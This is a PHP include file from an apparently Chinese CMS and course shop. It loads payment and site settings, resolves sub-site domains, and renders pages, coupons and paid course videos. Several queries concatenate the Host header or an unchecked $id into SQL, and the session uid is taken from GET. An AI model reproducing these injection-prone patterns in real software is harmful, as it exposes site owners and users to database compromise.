<?php
$dirx = dirname(dirname(__FILE__)) . "/";
$config = json_decode(file_get_contents($dirx . "conn/config.json"));

if (phpversion() < 5.4) {
    die("为保证网站安全，请使用PHP5.4或以上版本运行本程序！");
}

if ($config->news == "") {
    $news_show = "true";
} else {
    $news_show = $config->news;
}

if ($config->product == "") {
    $product_show = "true";
} else {
    $product_show = $config->product;
}

if ($config->course == "") {
    $course_show = "true";
} else {
    $course_show = $config->course;
}

if ($config->curlange == "") {
    $cur_lange = "zh";
} else {
    $cur_lange = $config->curlange;
}

$sql = "select * from sl_price";
$result1price = mysqli_query($conn, $sql);
$rowprice = mysqli_fetch_assoc($result1price);
$vipprice1 = $rowprice["vipprice1"];
$timelong1 = $rowprice["timelong1"];
$vipprice2 = $rowprice["vipprice2"];
$timelong2 = $rowprice["timelong2"];
$vipprice3 = $rowprice["vipprice3"];
$timelong3 = $rowprice["timelong3"];

$sql = "select * from sl_config";
$result = mysqli_query($conn, $sql);
$row = mysqli_fetch_assoc($result);
if (mysqli_num_rows($result) > 0) {

    $C_title = $row["C_title"];
    $C_keyword = $row["C_keyword"];
    $C_description = $row["C_description"];
    $C_copyright = $row["C_copyright"];
    $C_code = $row["C_code"];
    $C_logo = $row["C_logo"];
    $C_ico = $row["C_ico"];
    $C_kefu = $row["C_kefu"];
    $C_admin = $row["C_admin"];

    $C_newsds = $row["C_newsds"];
    $C_m_logo = $row["C_m_logo"];
    $C_m_position = $row["C_m_position"];
    $C_m_width = $row["C_m_width"];
    $C_m_height = $row["C_m_height"];
    $C_m_transparent = $row["C_m_transparent"];

    $C_alipay_pid = $row["C_alipay_pid"];
    $C_alipay_pkey = $row["C_alipay_pkey"];
    $C_dmf_id = $row["C_dmf_id"];
    $C_dmf_key = $row["C_dmf_key"];
    $C_dmf_key2 = $row["C_dmf_key2"];
    $C_qpay_appid = $row["C_qpay_appid"];
    $C_qpay_mchid = $row["C_qpay_mchid"];
    $C_qpay_key = $row["C_qpay_key"];

    $C_ttpay_mchid = $row["C_ttpay_mchid"];
    $C_ttpay_appid = $row["C_ttpay_appid"];
    $C_ttpay_secret = $row["C_ttpay_secret"];

    $C_7pay_pid = $row["C_7pay_pid"];
    $C_7pay_pkey = $row["C_7pay_pkey"];
    $C_codepay_id = $row["C_codepay_id"];
    $C_codepay_key = $row["C_codepay_key"];
    $C_codepay_type = $row["C_codepay_type"];
    $C_jipay_id = $row["C_jipay_id"];
    $C_jipay_key = $row["C_jipay_key"];
    $C_jipay_type = $row["C_jipay_type"];
    $C_hupay_id = $row["C_hupay_id"];
    $C_hupay_key = $row["C_hupay_key"];
    $C_hupay_type = $row["C_hupay_type"];
    $C_epay_url = $row["C_epay_url"];
    $C_epay_id = $row["C_epay_id"];
    $C_epay_key = $row["C_epay_key"];
    $C_epay_type = $row["C_epay_type"];
    $C_payjs_id = $row["C_payjs_id"];
    $C_payjs_key = $row["C_payjs_key"];
    $C_payjs_id2 = $row["C_payjs_id2"];
    $C_payjs_key2 = $row["C_payjs_key2"];
    $C_payjs_type = $row["C_payjs_type"];
    $C_wx_appid = $row["C_wx_appid"];
    $C_wx_appsecret = $row["C_wx_appsecret"];
    $C_wx_mchid = $row["C_wx_mchid"];
    $C_wx_key = $row["C_wx_key"];
    $C_qqid = $row["C_qqid"];
    $C_qqkey = $row["C_qqkey"];

    $C_alicode = $row["C_alicode"];
    $C_wxcode = $row["C_wxcode"];
    $C_kd = $row["C_kd"];

    $C_postage = $row["C_postage"];
    $C_baoyou = $row["C_baoyou"];

    $C_osson = $row["C_osson"];
    $C_oss_id = $row["C_oss_id"];
    $C_oss_key = $row["C_oss_key"];
    $C_oss_domain = $row["C_oss_domain"];
    $C_bucket = $row["C_bucket"];
    $C_region = $row["C_region"];

    $C_buylimit = $row["C_buylimit"];
    $C_viplimit = $row["C_viplimit"];

    $C_wxapp_id = $row["C_wxapp_id"];
    $C_wxapp_key = $row["C_wxapp_key"];
    $C_aliapp_id = $row["C_aliapp_id"];
    $C_aliapp_key = $row["C_aliapp_key"];
    $C_aliapp_key2 = $row["C_aliapp_key2"];
    $C_bdapp_id = $row["C_bdapp_id"];
    $C_bdapp_key = $row["C_bdapp_key"];
    $C_bdapp_key2 = $row["C_bdapp_key2"];
    $C_qqapp_id = $row["C_qqapp_id"];
    $C_qqapp_key = $row["C_qqapp_key"];
    $C_zjapp_id = $row["C_zjapp_id"];
    $C_zjapp_key = $row["C_zjapp_key"];

    $C_appt = $row["C_appt"];

    $C_alipayon = $row["C_alipayon"];
    $C_wxpayon = $row["C_wxpayon"];
    $C_7payon = $row["C_7payon"];
    $C_qpayon = $row["C_qpayon"];
    $C_dmfon = $row["C_dmfon"];
    $C_codepayon = $row["C_codepayon"];

    $C_alicodeon = $row["C_alicodeon"];
    $C_wxcodeon = $row["C_wxcodeon"];

    $C_kefuon = $row["C_kefuon"];
    $C_regon = $row["C_regon"];
    $C_qqon = $row["C_qqon"];
    $C_wxon = $row["C_wxon"];
    $C_qqon2 = $row["C_qqon2"];
    $C_wxon2 = $row["C_wxon2"];
    $C_dxon = $row["C_dxon"];
    $C_rzon = $row["C_rzon"];
    $C_fee = $row["C_fee"];
    $C_rzfee = $row["C_rzfee"];
    $C_rzfeetype = $row["C_rzfeetype"];
    $C_zd = $row["C_zd"];

    $C_fzon = $row["C_fzon"];
    $C_fzk = $row["C_fzk"];
    $C_zzk = $row["C_zzk"];
    $C_fzvip = $row["C_fzvip"];

    $C_punsh = $row["C_punsh"];
    $C_nunsh = $row["C_nunsh"];

    $C_vip1 = $row["C_vip1"];
    $C_vip2 = $row["C_vip2"];
    $C_vip3 = $row["C_vip3"];
    $C_vip6 = $row["C_vip6"];
    $C_vip12 = $row["C_vip12"];
    $C_vip0 = $row["C_vip0"];
    $C_p_discount = $row["C_p_discount"];
    $C_n_discount = $row["C_n_discount"];
    $C_p_discount2 = $row["C_p_discount2"];
    $C_n_discount2 = $row["C_n_discount2"];
    $C_c_discount = $row["C_c_discount"];
    $C_c_discount2 = $row["C_c_discount2"];

    $C_template = $row["C_template"];
    $C_wap = $row["C_wap"];
    $C_beian = $row["C_beian"];
    $C_qrcode = $row["C_qrcode"];
    $C_email = $row["C_email"];
    $C_phone = $row["C_phone"];
    $C_regr = $row["C_regr"];

    $C_authcode = $row["C_authcode"];
    $C_notice = $row["C_notice"];

    $C_mailtype = $row["C_mailtype"];
    $C_mailcode = $row["C_mailcode"];
    $C_smtp = $row["C_smtp"];
    $C_html = $row["C_html"];

    $C_fx1 = $row["C_fx1"];
    $C_fx2 = $row["C_fx2"];
    $C_fx3 = $row["C_fx3"];

    $C_fen1 = $row["C_fen1"];
    $C_fen2 = $row["C_fen2"];
    $C_fen3 = $row["C_fen3"];

    $C_dx1 = $row["C_dx1"];
    $C_dx2 = $row["C_dx2"];
    $C_dx3 = $row["C_dx3"];
    $C_dx4 = $row["C_dx4"];
    $C_dx5 = $row["C_dx5"];

    $C_memberon = $row["C_memberon"];
    $C_pwdcode = $row["C_pwdcode"];

    $C_mobile = $row["C_mobile"];
    $C_smssign = $row["C_smssign"];
    $C_userid = $row["C_userid"];
    $C_codeid = $row["C_codeid"];
    $C_codekey = $row["C_codekey"];

    $C_twice = $row["C_twice"];
    $C_uncopy = $row["C_uncopy"];
    $C_slide = $row["C_slide"];
    $C_backup = $row["C_backup"];
    $C_format = $row["C_format"];
    $C_bd_token = $row["C_bd_token"];

    $C_hotwords = $row["C_hotwords"];
    $C_fdomain = $row["C_fdomain"];
    $C_cache = 0;

    $C_contact = getrs("select T_content from sl_text where T_del=0 and T_type=1", "T_content");

    $C_domain = $_SERVER['HTTP_HOST'];
    $H_data = $row;
    $H_data["C_contact"] = $C_contact;
}

if (www($_SERVER['HTTP_HOST']) != www($C_fdomain) && $C_fdomain != "") {//分站域名访问
    if (getrs("select M_id from sl_member where M_domain='" . $_SERVER['HTTP_HOST'] . "'", "M_id") != "") {//使用绑定的域名
        $fmid = intval(getrs("select M_id from sl_member where M_domain='" . $_SERVER['HTTP_HOST'] . "'", "M_id"));
    } else {
        if (strpos($_SERVER['HTTP_HOST'], www($C_fdomain)) !== false) {//使用自带的域名
            $fmid = intval(splitx($_SERVER['HTTP_HOST'], ".", 0));
        } else {
            $fmid = 0;
        }
    }

    $sql = "select * from sl_member where M_id=" . $fmid;
    $result = mysqli_query($conn, $sql);
    if (mysqli_num_rows($result) > 0) {
        $row = mysqli_fetch_assoc($result);
        $M_sellertime = $row["M_sellertime"];
        $M_sellerlong = $row["M_sellerlong"];
        $M_show = $row["M_show"];
        $M_product = $row["M_product"];
        $M_news = $row["M_news"];

        if (time() - strtotime($M_sellertime) > $M_sellerlong * 86400 && $C_fzk == 1) {//商家到期
            die("该用户未开通分站功能");
        } else {
            if ($row["M_webtitle"] != "") {
                $C_title = $row["M_webtitle"];
                $H_data["C_title"] = $row["M_webtitle"];
            }
            if ($row["M_keyword"] != "") {
                $C_keyword = $row["M_keyword"];
                $H_data["C_keyword"] = $row["M_keyword"];
            }
            if ($row["M_description"] != "") {
                $C_description = $row["M_description"];
                $H_data["C_description"] = $row["M_description"];
            }
            if ($row["M_logo"] != "") {
                $C_logo = $row["M_logo"];
                $H_data["C_logo"] = $row["M_logo"];
            }
            if ($row["M_ico"] != "") {
                $C_ico = $row["M_ico"];
                $H_data["C_ico"] = $row["M_ico"];
            }
            if ($row["M_qrcode"] != "") {
                $C_qrcode = $row["M_qrcode"];
                $H_data["C_qrcode"] = $row["M_qrcode"];
            }
            if ($row["M_beian"] != "") {
                $C_beian = $row["M_beian"];
                $H_data["C_beian"] = $row["M_beian"];
            }
            if ($row["M_copyright"] != "") {
                $C_copyright = $row["M_copyright"];
                $H_data["C_copyright"] = $row["M_copyright"];
            }
            if ($row["M_mobile"] != "") {
                $C_phone = $row["M_mobile"];
                $H_data["C_phone"] = $row["M_mobile"];
            }
            if ($row["M_notice"] != "") {
                $C_notice = $row["M_notice"];
                $H_data["C_notice"] = $row["M_notice"];
            }
            if ($row["M_contact"] != "") {
                $C_contact = $row["M_contact"];
                $H_data["C_contact"] = $row["M_contact"];
            }
            if ($row["M_code"] != "") {
                $C_code = $row["M_code"];
                $H_data["C_code"] = $row["M_code"];
            }
            if ($row["M_kefu"] != "") {
                $C_kefu = $row["M_kefu"];
                $H_data["C_kefu"] = $row["M_kefu"];
            }

            if ($row["M_template"] != "") {
                $C_template = $row["M_template"];
                $H_data["C_template"] = $row["M_template"];
            }
            if ($row["M_wap"] != "") {
                $C_wap = $row["M_wap"];
                $H_data["C_wap"] = $row["M_wap"];
            }

            $priceup = 1 + $row["M_priceup"] / 100;
            if ($M_show == 1) {
                $M_ninfo = " and (N_mid=$fmid or instr('" . $M_news . "',CONCAT('|',N_id,'|'))>0)";
                $M_pinfo = " and (P_mid=$fmid or instr('" . $M_product . "',CONCAT('|',P_id,'|'))>0)";
            } else {
                $M_ninfo = " and N_mid=0 ";
                $M_pinfo = " and P_mid=0 ";
            }
        }
    } else {
        //die("该域名[".$_SERVER['HTTP_HOST']."]尚未绑定");
        $priceup = 1;
        $fmid = 0;
        if ($C_zzk == 1) {
            $M_ninfo = " and N_mid=0 ";
            $M_pinfo = " and P_mid=0 ";
        } else {
            $M_ninfo = "";
            $M_pinfo = "";
        }
    }
} else {
    $priceup = 1;
    $fmid = 0;
    if ($C_zzk == 1) {
        $M_ninfo = " and N_mid=0 ";
        $M_pinfo = " and P_mid=0 ";
    } else {
        $M_ninfo = "";
        $M_pinfo = "";
    }
}

if (strpos(strtolower($_SERVER['PHP_SELF']), "api/alipay/notify_url.php") === false && strpos(strtolower($_SERVER['PHP_SELF']), "pay/dmf/notify_url.php") === false && strpos(strtolower($_SERVER['PHP_SELF']), "tpl_edit.php") === false) {
    $_POST = array_map('check_input', $_POST);
}

if ($_GET["uid"] != "") {
    $_SESSION["uid"] = $_GET["uid"];
}

function p($price)
{
    global $priceup, $M_show;
    if (is_numeric($price)) {
        if ($M_show == 1) {
            return round($price, 2);
        } else {
            return round($price * $priceup, 2);
        }
    } else {
        return $price;
    }
}

function downpic($path, $url)
{
    global $C_osson;
    $name = date("YmdHis") . gen_key(3) . ".jpg";
    if (substr($url, 0, 2) == "//") {
        $url = "http:" . $url;
    }
    $url = getbody(str_replace("https://", "http://", $url), "", "GET");
    file_put_contents($path . $name, $url);
    if ($C_osson == 1) {
        tooss("../media/" . $name);
    }
    return $name;
}

function check_input($value)
{
    if (is_array($value)) {
        return $value;
    } else {
        return addslashes($value);
    }
}

function text($t)
{
    global $conn, $id, $C_kefu, $C_keyword, $C_description, $fmid, $C_contact;
    $sql = "select * from sl_text where T_id=" . $id;
    $result = mysqli_query($conn, $sql);
    $row = mysqli_fetch_assoc($result);
    if (mysqli_num_rows($result) > 0) {
        $t = str_Replace("[T_title]", $row["T_title"], $t);
        $t = str_Replace("[T_pic]", pic($row["T_pic"]), $t);
        $t = str_Replace("[T_order]", $row["T_order"], $t);
        if ($row["T_keywords"] == "") {//如果单页关键词为空，则调用网站关键词
            $t = str_Replace("[T_keywords]", $C_keyword, $t);
        } else {
            $t = str_Replace("[T_keywords]", $row["T_keywords"], $t);
        }
        if ($row["T_description"] == "") {//如果单页描述为空，则调用网站描述
            $t = str_Replace("[T_description]", $C_description, $t);
        } else {
            $t = str_Replace("[T_description]", $row["T_description"], $t);
        }

        switch ($row["T_type"]) {
            case 0:
            case 5:
                $T_content = $row["T_content"];
                break;

            case 1:
                $kf = explode("|", $C_kefu);
                for ($i = 0; $i < count($kf); $i++) {
                    switch (splitx($kf[$i], "_", 1)) {
                        case "qq":
                            $type = "QQ";
                            $url = "http://wpa.qq.com/msgrd?v=3&uin=" . splitx($kf[$i], "_", 0) . "&site=qq&menu=yes";
                            break;
                        case "ww":
                            $type = "旺旺";
                            $url = "http://www.taobao.com/webww/ww.php?ver=3&touid=" . splitx($kf[$i], "_", 0) . "&siteid=cntaobao&status=1&charset=utf-8";
                            break;
                        case "wx":
                            $type = "微信";
                            $url = "javascript:;";
                            break;
                        case "phone":
                            $type = "电话";
                            $url = "tel:" . splitx($kf[$i], "_", 0);
                            break;
                        case "email":
                            $type = "邮箱";
                            $url = "mailto:" . splitx($kf[$i], "_", 0);
                            break;
                    }
                    $kefu = $kefu . "<b>" . splitx($kf[$i], "_", 2) . "</b> <a href=\"" . $url . "\">" . $type . "：" . splitx($kf[$i], "_", 0) . "</a><br>";
                }
                if ($fmid == 0) {
                    $T_content = "<iframe src=\"conn/mapload.php?C_address=" . $row["T_address"] . "&C_zb=" . $row["T_zb"] . "\" scrolling=\"no\" name=\"mapif\" type=\"1\" frameborder=\"0\" height=\"400\" width=\"100%\" style=\"margin: 20px 0\"></iframe><p style=\"font-size:20px;font-weight:bold;\">联系方式：</p><p>" . $row["T_content"] . "</p><p style=\"font-size:20px;font-weight:bold;margin-top:10px;\">在线客服：</p><p>" . $kefu . "</p>";
                } else {
                    $T_content = "<p style=\"font-size:20px;font-weight:bold;\">联系方式：</p><p>" . $C_contact . "</p><p style=\"font-size:20px;font-weight:bold;margin-top:10px;\">在线客服：</p><p>" . $kefu . "</p>";

                }
                break;

            case 2:
                $T_content = $row["T_content"] . '<link href="css/form.css" rel="stylesheet">
<div class="form_container">
<form action="booksave.php?action=save" method="post">
<div class="right"><input type="text" name="G_title" placeholder="留言标题"></div>
<div class="right"><input type="text" name="G_name" placeholder="您的姓名"></div>
<div class="right"><input type="text" name="G_phone" placeholder="联系电话"></div>
<div class="right"><input type="text" name="G_mail" placeholder="电子邮箱"></div>
<div class="right"><textarea name="G_msg" placeholder="留言内容"></textarea></div>
<div class="right"><iframe src="conn/code_1.php?name=G_code" scrolling="no" frameborder="0" width="100%" height="40"></iframe></div>
<div class="right"><button type="submit">提交留言</button><button type="reset">重新填写</button></div>
</form>
</div>';
                break;
            case 3:
                $sql = "select Q_title,Q_order from (select * from sl_quan where Q_del=0 and Q_hide=0 and Q_gettime>now())b group by Q_title,Q_order order by Q_order asc";
                $result = mysqli_query($conn, $sql);
                if (mysqli_num_rows($result) > 0) {
                    while ($row = mysqli_fetch_assoc($result)) {
                        $Q = getrs("select * from sl_quan where Q_title='" . $row["Q_title"] . "'");
                        $rest = getrs("select count(Q_id) as Q_count from sl_quan where Q_del=0 and Q_hide=0 and Q_mid=0 and Q_gettime>now() and Q_title='" . $Q["Q_title"] . "'", "Q_count");

                        if ($Q["Q_pid"] > 0) {
                            $P_info = "" . getrs("select * from sl_product where P_id=" . $Q["Q_pid"], "P_title") . "";
                        } else {
                            $P_info = "店铺优惠券";
                        }

                        if ($Q["Q_discount"] > 0) {
                            $D_info = " 打" . ((100 - $Q["Q_discount"]) / 10) . "折";
                            $D_info2 = ((100 - $Q["Q_discount"]) / 10) . "折";
                        } else {
                            $D_info = "";
                            $D_info2 = "";
                        }

                        if ($Q["Q_minuse"] > 0) {
                            $M_info = " 减" . $Q["Q_minuse"] . "元";
                            $M_info2 = "￥" . $Q["Q_minuse"];
                        } else {
                            $M_info = "";
                            $M_info2 = "";
                        }
                        if ($_SESSION["M_id"] != "" && getrs("select * from sl_quan where Q_mid=" . intval($_SESSION["M_id"]) . " and Q_title='" . $Q["Q_title"] . "'")) {
                            $btn = "<div class=\"quan_get\">已领取</div>";
                            $info = "您已领取该优惠券，请在" . date("Y-m-d", strtotime($Q["Q_usetime"])) . "前使用";
                        } else {
                            if ($rest > 0) {
                                $btn = "<div class=\"quan_btn\" onclick=\"getquan(" . $Q["Q_id"] . ")\">立即领取</div>";
                                $info = "优惠券仅剩" . $rest . "张，请尽快领取！";
                            } else {
                                $btn = "<div class=\"quan_get\">已抢光</div>";
                                $info = "该优惠券已被抢光，下次早点来哦！";
                            }
                        }

                        $quan = $quan . "<div class=\"quan_box\">
					<div class=\"quan_bg\">券</div>
					
					<div style=\"float:right;text-align:right;margin-top:10px\">
					<b>" . $Q["Q_title"] . "</b><br>满" . $Q["Q_money"] . "元" . $M_info . $D_info . "
					</div>
					<div class=\"quan_dis\">" . $D_info2 . $M_info2 . "</div>
					<div class=\"quan_info\">$P_info</div>
					<div class=\"\">" . date("Y-m-d", strtotime($Q["Q_gettime"])) . "前领取 / " . date("Y-m-d", strtotime($Q["Q_usetime"])) . "前使用</div>
					" . $btn . "
					<div style=\"text-align:center;margin-top:5px;\">" . $info . "<span id=\"login_" . $Q["Q_id"] . "\"></span></div>
					
					</div>";
                    }
                }
                $js = '<script>
			function getquan(id){
				$.ajax({
		            url: "conn/f.php?action=getquan&Q_id="+id,
		            success: function(data) {
		                data = JSON.parse(data);
		                if (data.code == "success") {
		                    location.reload();
		                } else {
		                    alert(data.msg);
		                    if(data.msg=="请先登录会员帐号！"){
		                    	$("#login_"+id).html(" <a style=\'color:#fff\' href=\'member/login.php?from="+encodeURIComponent(window.location.href)+"\'>[登录帐号]</a>");
		                    }
		                }
		            }
		        });
			}
			</script>';
                $css = "<style>
			@media screen and (max-width:1024px){
			.quan_box{display:inline-block;width:calc(100% - 20px);margin:10px;vertical-align:top;border-radius:10px;padding:10px;background-image: linear-gradient(to left, #FF7A0C,#FF2A14);color:#fff;font-size:12px;position:relative;overflow:hidden}
			}
			@media screen and (min-width:1024px){
			.quan_box{display:inline-block;width:calc(33% - 40px);margin:10px;vertical-align:top;border-radius:10px;padding:10px;background-image: linear-gradient(to left, #FF7A0C,#FF2A14);color:#fff;font-size:12px;position:relative;overflow:hidden}
			}
			.quan_btn{height:30px;line-height:30px;background:#FFF577;border-radius:30px;text-align:center;color:#FF0000;margin-top:10px;cursor:pointer}
			.quan_get{height:30px;line-height:30px;background:#EEE;border-radius:30px;text-align:center;color:#666;margin-top:10px;cursor:pointer}
			.quan_dis{font-size:40px;line-height:70px;white-space: nowrap;text-overflow: ellipsis;overflow: hidden;word-break: break-all;}
			.quan_info{white-space: nowrap;text-overflow: ellipsis;overflow: hidden;word-break: break-all;font-weight:bold}
			.quan_bg{color:#FFF577;font-size:100px;border:solid 8px #FFF577;border-radius:100%;width:180px;height:180px;text-align:center;position:absolute;right:-50px;top:-50px;opacity:0.1;z-index:1;user-select:none}
			</style>";
                $T_content = $css . $js . $quan;

                break;
            case 4:
                $T_content = "<iframe src='member/query.php' marginheight='0' marginwidth='0' frameborder='0' scrolling='no' width='100%' height='100%' id='iframepage' name='iframepage' onLoad='iFrameHeight()' style='width:100%;max-width:900px;min-height:560px'></iframe>
<script type='text/javascript' language='javascript'>
function iFrameHeight() {
    var ifm= document.getElementById('iframepage');
    var subWeb = document.frames ? document.frames['iframepage'].document :ifm.contentDocument;
    if(ifm != null && subWeb != null){
        ifm.height = subWeb.body.scrollHeight;
        ifm.style.height= subWeb.body.scrollHeight+'px';
    }
}
window.timer = setInterval('iFrameHeight()', 500);
</script>";
                break;
        }
        $t = str_Replace("[T_content]", editor_oss($T_content), $t);
    }
    return $t;
}

function news($t)
{
    global $conn, $id, $C_keyword, $C_description;
    $M_id = intval($_GET["M_id"]);
    $sql = "select * from sl_nsort where S_id=" . $id;
    $result = mysqli_query($conn, $sql);
    $row = mysqli_fetch_assoc($result);
    if (mysqli_num_rows($result) > 0) {
        $t = str_Replace("[S_id]", $row["S_id"], $t);
        $t = str_Replace("[S_sub]", $row["S_sub"], $t);
        $t = str_Replace("[S_pic]", pic($row["S_pic"]), $t);
        $t = str_Replace("[S_title]", $row["S_title"], $t);
        $t = str_Replace("[S_order]", $row["S_order"], $t);
        if ($row["S_content"] == "") {
            $t = str_Replace("[S_content]", $C_description, $t);
        } else {
            $t = str_Replace("[S_content]", $row["S_content"], $t);
        }
        if ($row["S_keywords"] == "") {
            $t = str_Replace("[S_keywords]", $C_keyword, $t);
        } else {
            $t = str_Replace("[S_keywords]", $row["S_keywords"], $t);
        }
    } else {
        if (intval($M_id) > 0) {
            $M = getrs("select * from sl_member where M_id=$M_id");
            $M_shop = $M["M_shop"];
            $M_head = $M["M_head"];
            $t = str_Replace("[S_id]", "0", $t);
            $t = str_Replace("[S_title]", $M_shop, $t);
            $t = str_Replace("[S_keywords]", $M_shop, $t);
            $t = str_Replace("[S_content]", $M_shop, $t);
            $t = str_Replace("[S_pic]", pic($M_head), $t);
        } else {
            $t = str_Replace("[S_id]", "0", $t);
            $t = str_Replace("[S_title]", "全部文章", $t);
            $t = str_Replace("[S_keywords]", "全部文章", $t);
            $t = str_Replace("[S_content]", "ALL NEWS", $t);
            $t = str_Replace("[S_pic]", pic("nopic.png"), $t);
        }

    }
    return $t;
}


function course($t)
{
    global $conn, $id, $C_keyword, $C_description;
    $M_id = intval($_GET["M_id"]);
    $sql = "select * from sl_usort where S_id=" . $id;
    $result = mysqli_query($conn, $sql);
    $row = mysqli_fetch_assoc($result);
    if (mysqli_num_rows($result) > 0) {
        $t = str_Replace("[S_id]", $row["S_id"], $t);
        $t = str_Replace("[S_sub]", $row["S_sub"], $t);
        $t = str_Replace("[S_pic]", pic($row["S_pic"]), $t);
        $t = str_Replace("[S_title]", $row["S_title"], $t);
        $t = str_Replace("[S_order]", $row["S_order"], $t);
        if ($row["S_content"] == "") {
            $t = str_Replace("[S_content]", $C_description, $t);
        } else {
            $t = str_Replace("[S_content]", $row["S_content"], $t);
        }
        if ($row["S_keywords"] == "") {
            $t = str_Replace("[S_keywords]", $C_keyword, $t);
        } else {
            $t = str_Replace("[S_keywords]", $row["S_keywords"], $t);
        }
    } else {
        if (intval($M_id) > 0) {
            $M = getrs("select * from sl_member where M_id=$M_id");
            $M_shop = $M["M_shop"];
            $M_head = $M["M_head"];
            $t = str_Replace("[S_id]", "0", $t);
            $t = str_Replace("[S_title]", $M_shop, $t);
            $t = str_Replace("[S_keywords]", $M_shop, $t);
            $t = str_Replace("[S_content]", $M_shop, $t);
            $t = str_Replace("[S_pic]", pic($M_head), $t);
        } else {
            $t = str_Replace("[S_id]", "0", $t);
            $t = str_Replace("[S_title]", "全部课程", $t);
            $t = str_Replace("[S_keywords]", "全部课程", $t);
            $t = str_Replace("[S_content]", "ALL COURSE", $t);
            $t = str_Replace("[S_pic]", pic("nopic.png"), $t);
        }

    }
    return $t;
}


function c_video($id, $page)
{
    global $conn, $C_c_discount, $C_c_discount2, $C_keyword, $C_description;
    if ($page == 0) {
        $page = 1;
    }

    if ($_SESSION["M_id"] != "") {
        $H_id = getrs("select * from sl_history where H_hid=$id and H_mid=" . $_SESSION["M_id"] . " and H_type=2", "H_id");
        if ($H_id != "") {
            mysqli_query($conn, "update sl_history set H_hid2=$page,H_time='" . date('Y-m-d H:i:s') . "' where H_id=$H_id");
        } else {
            mysqli_query($conn, "insert into sl_history(H_type,H_hid,H_hid2,H_mid,H_time) values(2,$id,$page," . $_SESSION["M_id"] . ",'" . date('Y-m-d H:i:s') . "')");
        }
    }

    $genkey = date('YmdHis') . rand(1000, 9999);

    $sql = "select * from sl_course,sl_usort where C_sort=S_id and C_id=" . $id;
    $result = mysqli_query($conn, $sql);
    $row = mysqli_fetch_assoc($result);
    if (mysqli_num_rows($result) > 0) {
        $C_price = $row["C_price"];

        $lession = explode("||", $row["C_lesson"]);
        for ($i = 0; $i < count($lession); $i++) {
            if (strpos($lession[$i], "_") !== false) {
                $l = $l . $lession[$i] . "||";
            }
        }

        $ptitle = splitx(splitx($l, "||", ($page - 1)), "__", 0);
        $price = splitx(splitx($l, "||", ($page - 1)), "__", 1);
        $video = splitx(splitx($l, "||", ($page - 1)), "__", 2);

        $t = str_Replace("[S_id]", $row["S_id"], $t);
        $t = str_Replace("[C_title]", $row["C_title"], $t);
        $t = str_Replace("[C_ptitle]", $ptitle . " - " . $row["C_title"], $t);
        $t = str_Replace("[C_pic]", pic($row["C_pic"]), $t);
        $t = str_Replace("[C_price]", $row["C_price"], $t);
        $style = "<style>
		.u{height:100%;width:100%;min-height:250px;position:relative;background:#f7f7f7;display:block;}
		.u div{height:220px;width:300px;text-align:center;top:calc(50% - 110px);position:absolute;left:calc(50% - 150px);}
		</style>
		<link href=\"https://cdn.bootcdn.net/ajax/libs/video.js/7.10.1/video-js.min.css\" rel=\"stylesheet\">
		<script src=\"https://cdn.bootcdn.net/ajax/libs/video.js/7.10.1/video.min.js\"></script> 
		";

        if (substr($video, 0, 7) == "<iframe") {
            $v = $video;
        } else {
            if (substr($video, 0, 6) == "media/" || substr($video, 0, 7) == "http://" || substr($video, 0, 8) == "https://") {
                //无需加前缀
            } else {
                $video = "media/" . $video;
            }
            switch (substr(strrchr($video, '.'), 1)) {
                case "txt":
                    $v = "<div style=\"text-align:left;background:#fff;padding:10px;box-shadow: 0px 0px 10px #666666;height:100%;overflow:auto;width:100%\">" . str_replace("\r\n", "<br>", file_get_contents("../" . $video)) . "</div>";
                    break;
                case "mp3":
                    $v = "
			<video preload=\"auto\" class=\"video-js vjs-big-play-centered\" id=\"my-video\" poster=\"media/" . $row["C_pic"] . "\" controls data-setup=\"{}\">
			<source src=\"" . $video . "\" type=\"video/mp4\" />
			<p class=\"vjs-no-js\"> To view this video please enable JavaScript, and consider upgrading to a web browser that <a href=\"http://videojs.com/html5-video-support/\" target=\"_blank\">supports HTML5 video</a> </p>
			</video>";
                    break;
                case "mp4":
                case "mkv":
                    $v = "
			<video preload=\"auto\" class=\"video-js vjs-big-play-centered\" id=\"my-video\"  controls data-setup=\"{}\">
			<source src=\"" . $video . "\" type=\"video/mp4\" />
			<p class=\"vjs-no-js\"> To view this video please enable JavaScript, and consider upgrading to a web browser that <a href=\"http://videojs.com/html5-video-support/\" target=\"_blank\">supports HTML5 video</a> </p>
			</video>";
                    break;
            }
        }

        $M = getrs("select * from sl_member where M_id=" . intval($_SESSION["M_id"]));
        if ($M != "") {
            $M_viptime = $M["M_viptime"];
            $M_viplong = $M["M_viplong"];
            if ($M_viplong - (time() - strtotime($M_viptime)) / 86400 * 24 * 60 > 0) {
                if ($M_viplong > 30000) {
                    $C_discount = $C_c_discount2 / 10;
                } else {
                    $C_discount = $C_c_discount / 10;
                }
            } else {
                $C_discount = 1;
            }
        } else {
            $C_discount = 1;
        }

        if ($price > 0 && $C_price > 0) {//付费
            if ($M == "") {//未登录
                $x = "<div class=\"u\"><div><p><img src=\"images/v_nologin.png\"></p><p>亲，需要登录才能继续观看～
 </p><p><a href=\"member/login.php?from=" . urlencode("../?type=courseinfo&id=" . $id . "&page=" . $page) . "\" class=\"btn btn-info\">快速登录</a></p></div></div>";
            } else {
                $O = getrs("select * from sl_orders where O_cid=$id and O_state=1 and (O_content='all' or O_content='" . $page . "') and O_mid=" . intval($_SESSION["M_id"]));
                if ($O == "") {
                    $x = "<div class=\"u\"><div><p><img src=\"images/v_nologin.png\"></p><p>亲，需要购买才能继续观看～
 </p><p><a href=\"buy.php?type=courseinfo&id=$id&page=all&genkey=$genkey\" class=\"btn btn-primary\">" . ($C_price * $C_discount) . "元购买全套</a> <a href=\"buy.php?type=courseinfo&id=$id&page=$page&genkey=$genkey\" class=\"btn btn-info\">" . ($price * $C_discount) . "元购买本节</a></p></div></div>";
                } else {
                    $x = $v;
                }
            }
        } else {
            $x = $v;
        }

        $arr = array();
        $arr["video"] = $x . $style;
        $arr["title"] = $ptitle . " - " . $row["C_title"];
        return $arr;
    }
}

function courseintro($t)
{
    global $conn, $id, $C_c_discount, $C_c_discount2, $C_keyword, $C_description;
    $sql = "select * from sl_course,sl_usort where C_sort=S_id and C_id=" . $id;
    $result = mysqli_query($conn, $sql);
    $row = mysqli_fetch_assoc($result);
    if (mysqli_num_rows($result) > 0) {
        $t = str_Replace("[S_id]", $row["S_id"], $t);
        $t = str_Replace("[C_id]", $row["C_id"], $t);
        $t = str_Replace("[S_title]", $row["S_title"], $t);
        $t = str_Replace("[C_title]", $row["C_title"], $t);
        $t = str_Replace("[C_content]", $row["C_content"], $t);
        $t = str_Replace("[C_pic]", pic($row["C_pic"]), $t);
